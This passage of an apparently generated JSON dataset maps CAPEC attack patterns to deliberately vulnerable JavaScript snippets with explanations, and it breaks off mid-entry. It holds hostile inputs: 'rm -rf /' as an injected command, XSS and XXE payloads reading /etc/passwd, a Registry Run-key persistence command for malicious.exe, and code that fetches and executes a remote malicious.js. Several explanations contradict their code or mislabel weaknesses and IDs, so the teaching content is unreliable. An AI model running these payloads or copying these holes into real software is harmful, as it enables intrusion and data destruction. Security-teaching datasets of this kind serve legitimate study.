        "description": "This JavaScript code snippet demonstrates a vulnerability to 'XSS Using Doubled Characters' as described in the CAPEC. The 'userInput' variable contains a malicious script tag with doubled '<' characters. The 'sanitizedInput' variable attempts to sanitize the input by replacing doubled '<' characters with a single '<', but it fails to neutralize the script tag properly. When 'sanitizedInput' is assigned to 'document.body.innerHTML', the script executes, leading to a cross-site scripting (XSS) attack. This example highlights the improper neutralization of script-related HTML tags (CWE-80) and the failure to correctly handle doubled characters (CWE-85), resulting in a security vulnerability."
    },
    {
        "capec_id": "246",
        "capec_name": "DEPRECATED: XSS Using Flash",
        "code_snippet": "<html>\n<body>\n    <script>\n        // Vulnerable to XSS due to improper neutralization of user input\n        var userInput = \"<img src='x' onerror='alert(1)'>\";\n        // Incomplete denylist example\n        var denylist = ['<script>', '</script>'];\n        for (var i = 0; i < denylist.length; i++) {\n            userInput = userInput.replace(new RegExp(denylist[i], 'gi'), '');\n        }\n        // Improper neutralization of alternate XSS syntax\n        userInput = userInput.replace(/&lt;/g, '<').replace(/&gt;/g, '>');\n        // Permissive cross-domain policy\n        document.domain = 'untrusted.com';\n        // Doubled character XSS manipulation\n        userInput = userInput.replace(/\"\"/g, '\"');\n        // Improper neutralization in IMG tag attributes\n        document.write(userInput);\n    </script>\n</body>\n</html>",
        "description": "This JavaScript code snippet demonstrates several vulnerabilities related to Cross-Site Scripting (XSS) attacks. The code takes user input that includes an IMG tag with an onerror attribute designed to execute a script (alert). It attempts to sanitize the input using an incomplete denylist, which fails to cover all possible XSS vectors. Additionally, it improperly neutralizes alternate XSS syntax and allows for doubled character manipulations. The code also sets a permissive cross-domain policy, which can lead to security issues. Finally, it directly writes the user input to the document, making it vulnerable to XSS attacks through IMG tag attributes."
    },
    {
        "capec_id": "247",
        "capec_name": "XSS Using Invalid Characters",
        "code_snippet": "const userInput = '<script>alert(\"XSS\");</script>';\nconst sanitizedInput = userInput.replace(/<script>/gi, '');\ndocument.getElementById('output').innerHTML = sanitizedInput + '\\0<script>alert(\"XSS\");</script>';",
        "description": "This JavaScript code snippet demonstrates a vulnerability where an adversary can bypass input filtering by using invalid characters. The `userInput` contains a basic XSS payload. The `sanitizedInput` attempts to remove the `<script>` tag using a simple replace function. However, the attacker appends a null character (`\\0`) followed by another script tag to the sanitized input. Many filters stop processing at the null character, allowing the script tag after it to be executed. This represents the CAPEC scenario where invalid characters are used to bypass input filtering, leading to a potential XSS attack. The related CWEs highlight the improper neutralization of invalid characters, script-related HTML tags, and inappropriate encoding, all of which contribute to the vulnerability."
    },
    {
        "capec_id": "248",
        "capec_name": "Command Injection",
        "code_snippet": "const { exec } = require('child_process');\n\nfunction executeCommand(userInput) {\n  // Vulnerable to command injection\n  exec(`ls ${userInput}`, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`Error: ${error.message}`);\n      return;\n    }\n    if (stderr) {\n      console.error(`Stderr: ${stderr}`);\n      return;\n    }\n    console.log(`Stdout: ${stdout}`);\n  });\n}\n\n// Example usage\nexecuteCommand(''); // Safe input\nexecuteCommand('&& rm -rf /'); // Malicious input",
        "description": "This JavaScript code snippet demonstrates a command injection vulnerability. The `executeCommand` function takes user input and directly incorporates it into an `exec` call to list directory contents using the `ls` command. This is vulnerable to command injection because the user input is not properly sanitized or validated, allowing an attacker to inject malicious commands. For example, an attacker could input `&& rm -rf /` to delete the root directory. This snippet embodies the main idea of CAPEC-88 and related CWEs by showing how improper neutralization of special elements in command construction can lead to severe security issues."
    },
    {
        "capec_id": "249",
        "capec_name": "DEPRECATED: Linux Terminal Injection",
        "code_snippet": "const { exec } = require('child_process');\n\nfunction executeCommand(userInput) {\n  exec(userInput, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`Error: ${error.message}`);\n      return;\n    }\n    if (stderr) {\n      console.error(`Stderr: ${stderr}`);\n      return;\n    }\n    console.log(`Stdout: ${stdout}`);\n  });\n}\n\n// Example usage\nconst userInput = 'ls; rm -rf /'; // Malicious input\nexecuteCommand(userInput);",
        "description": "This JavaScript code snippet demonstrates a command injection vulnerability (CWE-77, CWE-78) by using the 'exec' function from the 'child_process' module to execute a command based on user input. The 'executeCommand' function takes user input and directly passes it to 'exec' without any sanitization or validation, allowing an attacker to inject malicious commands. In this example, the user input 'ls; rm -rf /' is used to illustrate how an attacker could execute arbitrary commands, potentially causing significant harm to the system. This embodies the main idea of the deprecated CAPEC 'Linux Terminal Injection' by showing how improper neutralization of special elements in commands can lead to security vulnerabilities."
    },
    {
        "capec_id": "250",
        "capec_name": "XML Injection",
        "code_snippet": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst xml2js = require('xml2js');\nconst app = express();\napp.use(bodyParser.text({ type: 'application/xml' }));\n\napp.post('/search', (req, res) => {\n  const userInput = req.body;\n  const parser = new xml2js.Parser();\n  parser.parseString(userInput, (err, result) => {\n    if (err) {\n      return res.status(400).send('Invalid XML');\n    }\n    const query = `//user[name='${result.user.name}']`;\n    // Simulate an XML database query\n    const xmlDatabase = `<users><user><name>admin</name><password>secret</password></user></users>`;\n    parser.parseString(xmlDatabase, (err, db) => {\n      if (err) {\n        return res.status(500).send('Server Error');\n      }\n      const xpath = require('xpath'), dom = require('xmldom').DOMParser;\n      const doc = new dom().parseFromString(xmlDatabase);\n      const nodes = xpath.select(query, doc);\n      if (nodes.length > 0) {\n        res.send(`User found: ${nodes[0].firstChild.data}`);\n      } else {\n        res.send('User not found');\n      }\n    });\n  });\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));",
        "description": "This JavaScript code snippet demonstrates a vulnerable XML Injection scenario using an Express.js server. The server accepts XML input from the user, parses it, and constructs an XPath query without proper input validation or neutralization. This allows an attacker to inject malicious XML content, potentially altering the query structure and accessing unauthorized data. The code highlights the risks associated with improper input validation (CWE-20), improper neutralization of special elements (CWE-74, CWE-91, CWE-707), and XPath Injection (CWE-643)."
    },
    {
        "capec_id": "251",
        "capec_name": "Local Code Inclusion",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction loadLocalLibrary(libName) {\n  const libPath = path.join(__dirname, libName);\n  if (fs.existsSync(libPath)) {\n    const lib = require(libPath);\n    return lib;\n  } else {\n    throw new Error('Library not found');\n  }\n}\n\n// Example usage\ntry {\n  const myLib = loadLocalLibrary('vulnerableLib.js');\n  myLib.execute();\n} catch (error) {\n  console.error(error.message);\n}",
        "description": "This JavaScript code snippet demonstrates a Local Code Inclusion vulnerability. The `loadLocalLibrary` function attempts to load a local JavaScript file specified by `libName`. If the file exists, it is required and its contents are executed. This can be exploited by an attacker to load arbitrary or malicious code from the local file system, especially if the attacker has previously placed a malicious file on the system. This snippet also touches on CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) by loading code from a potentially untrusted source, and CWE-913 (Improper Control of Dynamically-Managed Code Resources) by not properly restricting the inclusion of local files."
    },
    {
        "capec_id": "252",
        "capec_name": "PHP Local File Inclusion",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const filePath = queryObject.file;\n\n  if (filePath) {\n    fs.readFile(filePath, 'utf8', (err, data) => {\n      if (err) {\n        res.writeHead(404, {'Content-Type': 'text/plain'});\n        res.end('File not found');\n      } else {\n        res.writeHead(200, {'Content-Type': 'text/plain'});\n        res.end(data);\n      }\n    });\n  } else {\n    res.writeHead(400, {'Content-Type': 'text/plain'});\n    res.end('No file specified');\n  }\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server reads a file specified by a query parameter in the URL and returns its contents. The main idea of the CAPEC (PHP Local File Inclusion) is represented here by allowing an attacker to specify an arbitrary file path via the 'file' query parameter. This can lead to the inclusion and execution of unintended files, similar to how PHP Local File Inclusion vulnerabilities work. The related CWEs are reflected in the lack of validation and control over the file path input, which can lead to the inclusion of files from untrusted sources, improper handling of filenames, and potential external variable modification."
    },
    {
        "capec_id": "253",
        "capec_name": "Remote Code Inclusion",
        "code_snippet": "const http = require('http');\nconst vm = require('vm');\n\nhttp.get('http://example.com/malicious.js', (res) => {\n  let code = '';\n  res.on('data', (chunk) => { code += chunk; });\n  res.on('end', () => {\n    vm.runInThisContext(code); // Execute the downloaded code\n  });\n});",
        "description": "This JavaScript code snippet demonstrates a Remote Code Inclusion vulnerability. It uses the 'http' module to download a JavaScript file from a remote location ('http://example.com/malicious.js') and then executes the downloaded code using 'vm.runInThisContext'. This embodies the main idea of CAPEC-Remote Code Inclusion, where an attacker can force an application to load and execute arbitrary code from a remote source. The code also touches on related CWEs: CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) by importing and executing code from an untrusted source, CWE-494 (Download of Code Without Integrity Check) by not verifying the integrity of the downloaded code, and CWE-506 (Embedded Malicious Code) by potentially executing malicious code."
    },
    {
        "capec_id": "254",
        "capec_name": "DEPRECATED: DTD Injection in a SOAP Message",
        "code_snippet": "const xml2js = require('xml2js');\nconst fs = require('fs');\n\nconst xml = `<?xml version=\"1.0\"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<root>&xxe;</root>`;\n\nxml2js.parseString(xml, (err, result) => {\n  if (err) {\n    console.error('Error parsing XML:', err);\n  } else {\n    console.log('Parsed result:', result);\n  }\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerability related to DTD Injection (CAPEC-228) and improper control of Document Type Definition (CWE-827). The code uses the 'xml2js' library to parse an XML string that includes an external entity reference. The XML string defines a DTD with an entity 'xxe' that references the local file '/etc/passwd'. When the XML is parsed, the content of the referenced file is included in the parsed result, potentially exposing sensitive information. This example highlights the risk of allowing arbitrary DTDs in XML parsing, which can lead to information exposure and other security issues."
    },
    {
        "capec_id": "256",
        "capec_name": "SOAP Array Overflow",
        "code_snippet": "const http = require('http');\nconst xml2js = require('xml2js');\n\nconst server = http.createServer((req, res) => {\n  let body = '';\n  req.on('data', chunk => {\n    body += chunk.toString();\n  });\n  req.on('end', () => {\n    xml2js.parseString(body, (err, result) => {\n      if (err) {\n        res.writeHead(400, {'Content-Type': 'text/plain'});\n        res.end('Invalid XML');\n        return;\n      }\n      const arraySize = parseInt(result.array.$.size, 10);\n      const arrayData = result.array.item;\n      const buffer = new Array(arraySize);\n      for (let i = 0; i < arrayData.length; i++) {\n        buffer[i] = arrayData[i];\n      }\n      res.writeHead(200, {'Content-Type': 'text/plain'});\n      res.end('Array processed');\n    });\n  });\n});\n\nserver.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet sets up an HTTP server that processes incoming SOAP requests containing an array. The server reads the array size from the XML request and allocates a buffer based on this size. However, it does not verify if the actual array length matches the specified size, leading to potential buffer overflow vulnerabilities. This embodies the main idea of the CAPEC 'SOAP Array Overflow' and demonstrates related CWEs such as 'Buffer Access with Incorrect Length Value' and 'Improper Handling of Length Parameter Inconsistency'."
    },
    {
        "capec_id": "257",
        "capec_name": "DEPRECATED: Abuse of Transaction Data Structure",
        "code_snippet": "const fs = require('fs');\n\n// Simulate a transaction data structure\nlet transaction = {\n  id: 1,\n  amount: 100,\n  status: 'pending'\n};\n\n// Log transaction data to a file (CWE-532)\nfs.appendFile('transaction.log', JSON.stringify(transaction) + '\\n', (err) => {\n  if (err) throw err;\n  console.log('Transaction logged');\n});\n\n// Simulate an unauthorized modification (CWE-766, CWE-767)\ntransaction.amount = 1000;\n\n// Log the modified transaction data to a file (CWE-532)\nfs.appendFile('transaction.log', JSON.stringify(transaction) + '\\n', (err) => {\n  if (err) throw err;\n  console.log('Modified transaction logged');\n});\n\n// Simulate an authentication bypass (CWE-287)\nlet userAuthenticated = false;\nif (!userAuthenticated) {\n  console.log('Authentication bypassed');\n  // Access sensitive data\n  console.log('Sensitive data:', transaction);\n}",
        "description": "This JavaScript code snippet demonstrates a deprecated attack pattern related to the abuse of a transaction data structure. The code logs transaction data to a file, which can lead to information exposure through log files (CWE-532). It also shows how an unauthorized modification of the transaction data can occur (CWE-766, CWE-767). Additionally, it simulates an authentication bypass (CWE-287) to access sensitive transaction data. The code highlights the risks of improper data handling and logging practices, which can lead to security vulnerabilities."
    },
    {
        "capec_id": "258",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Dynamic Update",
        "code_snippet": "const http = require('http');\nconst crypto = require('crypto');\n\nconst server = http.createServer((req, res) => {\n  if (req.url === '/update' && req.method === 'POST') {\n    let body = '';\n    req.on('data', chunk => {\n      body += chunk.toString();\n    });\n    req.on('end', () => {\n      const { username, password, data } = JSON.parse(body);\n      // Client-side authentication (CWE-603)\n      if (username === 'admin' && password === 'password123') {\n        // Simulate dynamic update\n        const updateData = crypto.createHash('sha256').update(data).digest('hex');\n        res.writeHead(200, { 'Content-Type': 'application/json' });\n        res.end(JSON.stringify({ status: 'success', updateData }));\n      } else {\n        res.writeHead(401, { 'Content-Type': 'application/json' });\n        res.end(JSON.stringify({ status: 'failure', message: 'Unauthorized' }));\n      }\n    });\n  } else {\n    res.writeHead(404, { 'Content-Type': 'application/json' });\n    res.end(JSON.stringify({ status: 'failure', message: 'Not Found' }));\n  }\n});\n\nserver.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server that listens for POST requests to the '/update' endpoint. It performs client-side authentication by checking the username and password within the client code (CWE-603). If the credentials match, it simulates a dynamic update by hashing the provided data and sending it back to the client. This setup is vulnerable to sniffing and capture-replay attacks (CAPEC-65 and CWE-294) because the authentication is done on the client side, and the data can be intercepted and replayed by an attacker. The code demonstrates the main idea of the deprecated CAPEC by showing how sensitive operations can be compromised due to weak client-side authentication and the potential for sniffing and replay attacks."
    },
    {
        "capec_id": "259",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Patching",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\nconst server = http.createServer((req, res) => {\n  if (req.url === '/patch' && req.method === 'POST') {\n    let body = '';\n    req.on('data', chunk => {\n      body += chunk.toString();\n    });\n    req.on('end', () => {\n      // Vulnerable: Saving patch data to a file without proper authentication\n      fs.writeFile('patch_data.txt', body, (err) => {\n        if (err) throw err;\n        console.log('Patch data saved!');\n        res.end('Patch received');\n      });\n    });\n  } else {\n    res.statusCode = 404;\n    res.end('Not Found');\n  }\n});\n\nserver.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens for POST requests to the '/patch' endpoint. When a request is received, it captures the data and saves it to a file named 'patch_data.txt'. The code is vulnerable because it does not perform any authentication checks before saving the patch data. This represents the main idea of the CAPEC, where an attacker could sniff and capture application code during patching. The related CWEs provide additional context, such as CWE-294 (Authentication Bypass by Capture-replay) and CWE-603 (Use of Client-Side Authentication), highlighting the lack of proper authentication mechanisms."
    },
    {
        "capec_id": "260",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Initial Distribution",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nclient.connect(8080, '127.0.0.1', () => {\n    console.log('Connected');\n    client.write('AUTH user:password'); // Client-side authentication\n});\n\nclient.on('data', (data) => {\n    console.log('Received: ' + data);\n    client.destroy(); // Close the connection after receiving data\n});\n\nclient.on('close', () => {\n    console.log('Connection closed');\n});\n\n// Sniffer to capture and replay authentication\nconst sniffer = new net.Socket();\nsniffer.connect(8080, '127.0.0.1', () => {\n    console.log('Sniffer Connected');\n    sniffer.write('AUTH user:password'); // Replay captured authentication\n});\n\nsniffer.on('data', (data) => {\n    console.log('Sniffer Received: ' + data);\n    sniffer.destroy(); // Close the connection after receiving data\n});\n\nsniffer.on('close', () => {\n    console.log('Sniffer Connection closed');\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerable client-server authentication mechanism and a sniffer that captures and replays the authentication data. The client connects to a server and sends authentication credentials ('AUTH user:password') which are handled on the client-side, making it susceptible to capture-replay attacks (CWE-294). The sniffer mimics the client by connecting to the same server and replaying the captured authentication data, effectively bypassing the authentication. This represents the main idea of CAPEC-65, where an attacker can sniff and capture application code or data during its initial distribution and use it to bypass authentication mechanisms."
    },
    {
        "capec_id": "261",
        "capec_name": "Fuzzing for garnering other adjacent user/sensitive data",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst bodyParser = require('body-parser');\nconst mysql = require('mysql');\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst db = mysql.createConnection({\n  host: 'localhost',\n  user: 'root',\n  password: '',\n  database: 'test_db'\n});\n\ndb.connect((err) => {\n  if (err) throw err;\n  console.log('Connected to database');\n});\n\napp.post('/search', (req, res) => {\n  const searchTerm = req.body.searchTerm;\n  const query = `SELECT * FROM users WHERE name LIKE '%${searchTerm}%'`;\n  db.query(query, (err, results) => {\n    if (err) {\n      console.error('Database error:', err);\n      res.status(500).send('Internal Server Error');\n      return;\n    }\n    res.json(results);\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet sets up an Express.js server with a MySQL database connection. It includes an endpoint '/search' that takes a 'searchTerm' from the request body and constructs an SQL query to search for users by name. The query is vulnerable to SQL Injection (CWE-89) because it directly incorporates user input without proper sanitization. Additionally, if an error occurs during the database query, the error message is logged, potentially exposing sensitive information (CWE-209). This code exemplifies the CAPEC concept of 'Fuzzing for garnering other adjacent user/sensitive data' by allowing an adversary to send modified queries that could return unintended information or cause errors that reveal sensitive details."
    },
    {
        "capec_id": "263",
        "capec_name": "Force Use of Corrupted Files",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction processFile(filePath) {\n  if (!fs.existsSync(filePath)) {\n    throw new Error('File does not exist');\n  }\n\n  const fileExtension = path.extname(filePath);\n  if (fileExtension !== '.txt') {\n    throw new Error('Unsupported file type');\n  }\n\n  const fileContent = fs.readFileSync(filePath, 'utf8');\n  // Process the file content\n  console.log('Processing file:', fileContent);\n}\n\n// Simulate an attacker uploading a corrupted file\nconst attackerFilePath = 'attacker_file.txt';\nfs.writeFileSync(attackerFilePath, 'corrupted content');\n\ntry {\n  processFile(attackerFilePath);\n} catch (error) {\n  console.error('Error processing file:', error.message);\n}",
        "description": "This JavaScript code snippet demonstrates a scenario where an application processes a file based on its extension. The `processFile` function checks if the file exists and if its extension is `.txt`. If these conditions are met, it reads and processes the file content. The code simulates an attacker uploading a corrupted file named `attacker_file.txt`. This example embodies the CAPEC concept of forcing an application to use a corrupted file, potentially leading to denial of service or other vulnerabilities. The related CWEs are represented by the reliance on the file extension (CWE-646) and the potential for processing dangerous file types (CWE-434)."
    },
    {
        "capec_id": "264",
        "capec_name": "DEPRECATED: Environment Variable Manipulation",
        "code_snippet": "const exec = require('child_process').exec;\n\n// CWE-1108: Excessive Reliance on Global Variables\nlet globalEnvVar = process.env.PATH;\n\nfunction runCommand(userInput) {\n  // CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')\n  let command = `echo ${userInput}`;\n  exec(command, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`exec error: ${error}`);\n      return;\n    }\n    console.log(`stdout: ${stdout}`);\n    console.error(`stderr: ${stderr}`);\n  });\n}\n\n// CWE-1126: Declaration of Variable with Unnecessarily Wide Scope\nlet userInput = process.argv[2];\nrunCommand(userInput);",
        "description": "This JavaScript code snippet demonstrates a vulnerable pattern related to environment variable manipulation and several related CWEs. The code uses a global variable 'globalEnvVar' to store an environment variable (CWE-1108). The 'runCommand' function constructs a command string using user input without proper sanitization, leading to potential command injection (CWE-95). Additionally, the 'userInput' variable is declared with unnecessarily wide scope (CWE-1126). This code highlights the risks of improper handling of environment variables and user inputs, which can lead to security vulnerabilities."
    },
    {
        "capec_id": "265",
        "capec_name": "DEPRECATED: Global variable manipulation",
        "code_snippet": "var globalVar = 'sensitiveData';\n\nfunction manipulateGlobalVar(userInput) {\n    eval('globalVar = ' + userInput);\n}\n\nmanipulateGlobalVar('\"newData\"');\nconsole.log(globalVar);",
        "description": "This JavaScript code snippet demonstrates the vulnerability of global variable manipulation. The global variable 'globalVar' is declared and holds sensitive data. The function 'manipulateGlobalVar' takes user input and uses the 'eval' function to dynamically modify the global variable. This represents CWE-1108 (Excessive Reliance on Global Variables) and CWE-627 (Dynamic Variable Evaluation). The use of 'eval' allows an attacker to inject arbitrary code, leading to potential security risks such as unauthorized data modification or code execution. This snippet embodies the main idea of CAPEC-77 by showing how user-controlled variables can be manipulated to affect global state."
    },
    {
        "capec_id": "266",
        "capec_name": "DEPRECATED: Manipulate Canonicalization",
        "code_snippet": "const userInput = \"../../etc/passwd\";\n\nfunction validateInput(input) {\n  const validPattern = /^[a-zA-Z0-9_]+$/;\n  return validPattern.test(input);\n}\n\nfunction canonicalize(input) {\n  const path = require('path');\n  return path.normalize(input);\n}\n\nif (validateInput(userInput)) {\n  const safePath = canonicalize(userInput);\n  console.log(`Safe path: ${safePath}`);\n} else {\n  console.log('Invalid input');\n}",
        "description": "This JavaScript code snippet demonstrates a vulnerability related to CAPEC 'Manipulate Canonicalization' and CWE-180 'Incorrect Behavior Order: Validate Before Canonicalize'. The code first validates the user input using a regular expression to ensure it only contains alphanumeric characters and underscores. However, it then canonicalizes the input using the 'path.normalize' function. This order of operations is incorrect because the input could be manipulated to bypass validation and result in a dangerous path, such as accessing sensitive files. The code represents the main idea of the CAPEC by showing how improper handling of canonicalization can lead to security issues."
    },
    {
        "capec_id": "267",
        "capec_name": "Leverage Alternate Encoding",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst port = 3000;\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/submit', (req, res) => {\n  let userInput = req.body.input;\n  // Validate input before canonicalization\n  if (!/^[a-zA-Z0-9]+$/.test(userInput)) {\n    return res.status(400).send('Invalid input');\n  }\n  // Canonicalize input\n  userInput = decodeURIComponent(userInput);\n  // Use the input in a file path\n  const filePath = `/uploads/${userInput}.txt`;\n  res.send(`File path is: ${filePath}`);\n});\n\napp.listen(port, () => {\n  console.log(`Server running at http://localhost:${port}/`);\n});",
        "description": "This JavaScript code snippet sets up an Express server that handles POST requests to the '/submit' endpoint. The server receives user input, validates it using a regular expression to ensure it only contains alphanumeric characters, and then decodes the input using `decodeURIComponent`. This sequence represents the CAPEC 'Leverage Alternate Encoding' by showing how improper handling of alternate encoding can lead to vulnerabilities. Specifically, the code validates the input before canonicalizing it, which is a common mistake (CWE-180). Additionally, the code constructs a file path using user input without proper neutralization, which can lead to file path manipulation (CWE-73). This example highlights the importance of correct input validation and canonicalization order to prevent security issues."
    },
    {
        "capec_id": "268",
        "capec_name": "Audit Log Manipulation",
        "code_snippet": "const fs = require('fs');\nconst logFilePath = '/var/log/app.log';\n\nfunction logEvent(event) {\n  const logEntry = `${new Date().toISOString()} - ${event}\\n`;\n  fs.appendFileSync(logFilePath, logEntry);\n}\n\nfunction manipulateLog() {\n  const maliciousEntry = '2023-10-01T00:00:00.000Z - User login failed: admin\\n';\n  fs.appendFileSync(logFilePath, maliciousEntry);\n}\n\n// Example usage\nlogEvent('User login successful: user123');\nmanipulateLog();",
        "description": "This JavaScript code snippet demonstrates a basic logging mechanism and how an attacker might manipulate the log file. The `logEvent` function appends a log entry to a log file, while the `manipulateLog` function injects a malicious log entry. This example embodies the CAPEC of Audit Log Manipulation by showing how an attacker can inject false log entries due to insufficient access controls (CWE-117). The code also highlights potential issues such as improper output neutralization (CWE-117), insertion of sensitive information (CWE-532), and exposure of sensitive system information (CWE-497)."
    },
    {
        "capec_id": "269",
        "capec_name": "DEPRECATED: Registry Manipulation",
        "code_snippet": "const fs = require('fs');\nconst registryKey = 'HKEY_LOCAL_MACHINE\\\\Software\\\\MyApp';\nconst sensitiveData = 'password123';\n\n// Insecurely storing sensitive data in the registry\nfs.writeFileSync(registryKey, sensitiveData, 'utf8');\n\n// Function to switch privileges\nfunction switchPrivileges(user) {\n  if (user === 'admin') {\n    // Simulate privilege escalation\n    console.log('Switched to admin privileges');\n  } else {\n    // Simulate privilege de-escalation\n    console.log('Switched to user privileges');\n  }\n}\n\n// Incomplete documentation of program execution\nswitchPrivileges('admin');\nswitchPrivileges('user');",
        "description": "This JavaScript code snippet demonstrates several security weaknesses related to registry manipulation. It insecurely stores sensitive information (a password) in the registry in cleartext (CWE-314). The code also includes a function to switch privileges, which simulates privilege context switching (CWE-270). Additionally, the program execution is not fully documented, which can lead to incomplete understanding and potential security risks (CWE-1112). This snippet embodies the main idea of CAPEC-203: Manipulate Application Registry Values, by showing how sensitive data can be mishandled in the registry and how privilege management can be flawed."
    },
    {
        "capec_id": "270",
        "capec_name": "Modification of Registry Run Keys",
        "code_snippet": "const { exec } = require('child_process');\nconst registryKey = 'HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run';\nconst appName = 'MaliciousApp';\nconst appPath = 'C:\\\\path\\\\to\\\\malicious.exe';\n\nexec(`reg add ${registryKey} /v ${appName} /t REG_SZ /d ${appPath} /f`, (error, stdout, stderr) => {\n  if (error) {\n    console.error(`Error: ${error.message}`);\n    return;\n  }\n  if (stderr) {\n    console.error(`Stderr: ${stderr}`);\n    return;\n  }\n  console.log(`Stdout: ${stdout}`);\n});",
        "description": "This JavaScript code snippet demonstrates how an adversary could add a new entry to the Windows registry 'run keys' to ensure a malicious application is executed when a user logs in. The 'exec' function from the 'child_process' module is used to run a command that adds a new registry key under 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'. The key is named 'MaliciousApp' and points to the path of the malicious executable. This embodies the CAPEC of 'Modification of Registry Run Keys' by showing how an attacker can achieve persistence on a target system. The code also touches on CWE-15 (External Control of System or Configuration Setting) by allowing external control over the registry settings, and CWE-314 (Cleartext Storage in the Registry) by storing the path to the malicious executable in cleartext."
    },
    {
        "capec_id": "271",
        "capec_name": "Schema Poisoning",
        "code_snippet": "const express = require('express');\nconst fs = require('fs');\nconst app = express();\n\n// Middleware to parse JSON bodies\napp.use(express.json());\n\n// Endpoint to update schema\napp.post('/update-schema', (req, res) => {\n  const schemaPath = './schema.json';\n  const newSchema = req.body.schema;\n\n  // CWE-15: External Control of System or Configuration Setting\n  fs.writeFile(schemaPath, JSON.stringify(newSchema), (err) => {\n    if (err) {\n      return res.status(500).send('Error updating schema');\n    }\n    res.send('Schema updated successfully');\n  });\n});\n\n// Endpoint to get data based on schema\napp.get('/data', (req, res) => {\n  const schemaPath = './schema.json';\n\n  // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n  fs.readFile(schemaPath, 'utf8', (err, schemaData) => {\n    if (err) {\n      return res.status(500).send('Error reading schema');\n    }\n    const schema = JSON.parse(schemaData);\n    // Simulate data retrieval based on schema\n    const data = { message: 'Data based on schema', schema: schema };\n    res.json(data);\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet represents a simple Express.js application that allows users to update a schema and retrieve data based on that schema. The '/update-schema' endpoint allows users to send a new schema in the request body, which is then written to a file (CWE-15: External Control of System or Configuration Setting). The '/data' endpoint reads the schema from the file and uses it to structure the response data (CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere). This setup is vulnerable to schema poisoning, as an adversary can modify the schema to affect how the application handles or interprets resources, potentially leading to security issues such as denial of service or data corruption."
    },
    {
        "capec_id": "272",
        "capec_name": "Protocol Manipulation",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nclient.connect(1337, '127.0.0.1', () => {\n  console.log('Connected');\n  // CWE-301: Reflection Attack in an Authentication Protocol\n  client.write('AUTH user:password');\n});\n\nclient.on('data', (data) => {\n  console.log('Received: ' + data);\n  // CWE-294: Authentication Bypass by Capture-replay\n  if (data.toString() === 'AUTH_SUCCESS') {\n    client.write('REPLAY AUTH user:password');\n  }\n  // CWE-924: Improper Enforcement of Message Integrity During Transmission\n  if (data.toString().includes('MODIFIED')) {\n    console.log('Message integrity compromised');\n  }\n});\n\nclient.on('close', () => {\n  console.log('Connection closed');\n});",
        "description": "This JavaScript code snippet demonstrates a TCP client that connects to a server and performs a simple authentication protocol. The code embodies the main idea of CAPEC-272 (Protocol Manipulation) by showcasing vulnerabilities related to improper verification and message integrity. Specifically, it includes:\n\n1. CWE-301: Reflection Attack in an Authentication Protocol - The client sends an 'AUTH' message which could be reflected back by an attacker to impersonate a trusted user.\n2. CWE-294: Authentication Bypass by Capture-replay - The client replays the 'AUTH' message upon receiving an 'AUTH_SUCCESS' response, demonstrating a capture-replay attack.\n3. CWE-924: Improper Enforcement of Message Integrity During Transmission - The client checks if the received message contains 'MODIFIED', indicating that the message integrity was compromised during transmission.\n\nThis code highlights how an adversary can manipulate a communication protocol to perform various attacks, such as impersonation, replay attacks, and message tampering."
    },
    {
        "capec_id": "273",
        "capec_name": "HTTP Response Smuggling",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  let body = '';\n  req.on('data', chunk => {\n    body += chunk;\n  });\n  req.on('end', () => {\n    // Vulnerable to HTTP Response Smuggling\n    if (body.includes('\\r\\n')) {\n      res.writeHead(200, { 'Content-Type': 'text/plain' });\n      res.end('HTTP/1.1 200 OK\\r\\nContent-Length: 13\\r\\n\\r\\nHello, World!\\r\\nHTTP/1.1 200 OK\\r\\nContent-Length: 13\\r\\n\\r\\nInjected!');\n    } else {\n      res.writeHead(200, { 'Content-Type': 'text/plain' });\n      res.end('Hello, World!');\n    }\n  });\n}).listen(8080);",
